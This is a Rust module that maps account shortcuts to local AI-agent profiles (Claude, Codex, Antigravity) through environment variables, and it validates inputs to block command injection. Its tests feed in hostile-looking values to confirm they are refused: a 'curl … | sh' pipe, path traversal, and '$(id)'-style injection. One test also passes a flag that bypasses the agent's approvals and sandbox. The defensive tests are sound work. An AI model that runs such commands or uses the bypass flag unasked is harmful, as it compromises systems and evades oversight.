//! Account selection is local and never runs networked `auth status` before launching.
use anyhow::{bail, Context, Result};
use serde_json::Value;
use std::{collections::BTreeMap, path::Path, process::Command};

#[derive(Debug)]
pub struct Account {
    pub id: String,
    pub agent: String,
    pub command: String,
    pub view_mode: String,
    pub set: BTreeMap<String, String>,
    pub unset: Vec<String>,
}

pub fn resolve(config: &Value, name: &str, home: &Path) -> Result<Account> {
    let upper = name.to_uppercase();
    let id = config["aliases"][&upper].as_str().unwrap_or(&upper);
    let value = &config["accounts"][id];
    let agent = value["agent"]
        .as_str()
        .context("unknown account")?
        .to_string();
    let command = value["command"].as_str().unwrap_or(&agent).to_string();
    let view_mode = value["viewMode"]
        .as_str()
        .unwrap_or(if agent == "antigravity" { "terminal" } else { "chat" })
        .to_string();
    anyhow::ensure!(
        command
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_.".contains(c)),
        "invalid account executable"
    );
    let switch = value["switchCommand"]
        .as_str()
        .context("missing switchCommand")?;
    let mut account = Account {
        id: id.into(),
        agent,
        command,
        view_mode,
        set: BTreeMap::new(),
        unset: vec![],
    };
    match switch.split_whitespace().collect::<Vec<_>>().as_slice() {
        ["true"] => (),
        ["ccp", "admin" | "default" | "primary"] => account.unset.push("CLAUDE_CONFIG_DIR".into()),
        ["ccp", profile] => {
            account.set.insert(
                "CLAUDE_CONFIG_DIR".into(),
                profile_path(home, ".claude-profiles", profile)?,
            );
        }
        ["cxp", "main" | "default" | "primary"] => account.unset.push("CODEX_HOME".into()),
        ["cxp", profile] => {
            account.set.insert(
                "CODEX_HOME".into(),
                profile_path(home, ".codex-profiles", profile)?,
            );
        }
        ["export", assignment] if assignment.starts_with("AG2_ACCOUNT=") => {
            account
                .set
                .insert("AG2_ACCOUNT".into(), assignment[12..].into());
        }
        _ => bail!("unsupported account switch; no shell command was executed: {switch}"),
    }
    Ok(account)
}

fn profile_path(home: &Path, dir: &str, profile: &str) -> Result<String> {
    anyhow::ensure!(
        !profile.is_empty()
            && profile
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "-_".contains(c)),
        "invalid profile name"
    );
    Ok(home.join(dir).join(profile).to_string_lossy().into())
}

pub fn quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

impl Account {
    pub fn shell_command(&self, args: &str) -> String {
        let isolation = if self.agent == "codex" {
            " --no-daemon"
        } else {
            ""
        };
        format!("exec {}{isolation} {args}", quote(&self.command))
    }
    /// The agent's argv when `args` holds only plain words; `None` means it needs shell parsing.
    pub fn argv(&self, args: &str) -> Option<Vec<String>> {
        let plain = |w: &str| w.chars().all(|c| c.is_ascii_alphanumeric() || "-_=.,:/@+%".contains(c));
        let words: Vec<&str> = args.split_whitespace().collect();
        if !words.iter().all(|w| plain(w)) {
            return None;
        }
        let mut argv = vec![self.command.clone()];
        if self.agent == "codex" {
            argv.push("--no-daemon".into());
        }
        argv.extend(words.into_iter().map(String::from));
        Some(argv)
    }
    pub fn apply(&self, command: &mut Command) {
        for key in &self.unset {
            command.env_remove(key);
        }
        command.envs(&self.set);
    }
    pub fn ensure_profile(&self) -> Result<()> {
        for key in ["CLAUDE_CONFIG_DIR", "CODEX_HOME"] {
            if let Some(path) = self.set.get(key) {
                anyhow::ensure!(
                    Path::new(path).is_dir(),
                    "account {} is not installed on this Mac ({key})",
                    self.id
                );
            }
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    #[test]
    fn shipped_template_resolves_all_twelve_slots() {
        let c: Value =
            serde_json::from_str(include_str!("../../../../account-shortcuts/accounts.json")).unwrap();
        let home = Path::new("/Users/test");
        let ids = ["A1", "A2", "A3", "A4", "A5", "A6", "A7", "C1", "C2", "AG1", "AG2", "G1"];
        assert_eq!(c["accounts"].as_object().unwrap().len(), ids.len());
        for id in ids {
            assert_eq!(resolve(&c, id, home).unwrap().id, id);
        }
        let claude = resolve(&c, "cl3", home).unwrap();
        assert_eq!(claude.id, "A3");
        assert_eq!(claude.set["CLAUDE_CONFIG_DIR"], "/Users/test/.claude-profiles/team1");
        let antigravity = resolve(&c, "ag1", home).unwrap();
        assert_eq!((antigravity.command.as_str(), antigravity.view_mode.as_str()), ("agy", "terminal"));
        let second = resolve(&c, "AG2", home).unwrap();
        assert_eq!(second.command, "agy-work");
        assert_eq!(second.set["AG2_ACCOUNT"], "work");
    }
    #[test]
    fn aliases_choose_isolated_profiles_without_auth_command() {
        let c = json!({"aliases":{"CO2":"C2"},"accounts":{"C2":{"agent":"codex","switchCommand":"cxp work"}}});
        let a = resolve(&c, "co2", Path::new("/Users/test")).unwrap();
        assert_eq!(a.set["CODEX_HOME"], "/Users/test/.codex-profiles/work");
        assert_eq!(a.shell_command("--foo"), "exec 'codex' --no-daemon --foo");
    }
    #[test]
    fn primary_profile_removes_inherited_secondary_account() {
        let c = json!({"accounts":{"A1":{"agent":"claude","switchCommand":"ccp admin"}}});
        assert_eq!(
            resolve(&c, "A1", Path::new("/tmp")).unwrap().unset,
            ["CLAUDE_CONFIG_DIR"]
        );
    }
    #[test]
    fn unknown_switch_and_profile_traversal_are_refused() {
        for switch in ["ccp ../admin", "curl example.com | sh"] {
            let c = json!({"accounts":{"A1":{"agent":"claude","switchCommand":switch}}});
            assert!(resolve(&c, "A1", Path::new("/tmp")).is_err());
        }
    }
    #[test]
    fn plain_arguments_exec_directly_and_quoted_ones_need_a_shell() {
        let c = json!({"accounts":{"C1":{"agent":"codex","switchCommand":"cxp main"},"A1":{"agent":"claude","switchCommand":"ccp admin"}}});
        let codex = resolve(&c, "C1", Path::new("/tmp")).unwrap();
        assert_eq!(
            codex.argv("--dangerously-bypass-approvals-and-sandbox").unwrap(),
            ["codex", "--no-daemon", "--dangerously-bypass-approvals-and-sandbox"]
        );
        let claude = resolve(&c, "A1", Path::new("/tmp")).unwrap();
        assert_eq!(claude.argv("").unwrap(), ["claude"]);
        for shell in ["--allow \"*\"", "--x $(id)", "--a;b", "--a 'b c'"] {
            assert!(claude.argv(shell).is_none(), "{shell}");
        }
    }
    #[test]
    fn quote_cannot_inject_another_command() {
        assert_eq!(quote("a'b"), "'a'\\''b'");
    }
}
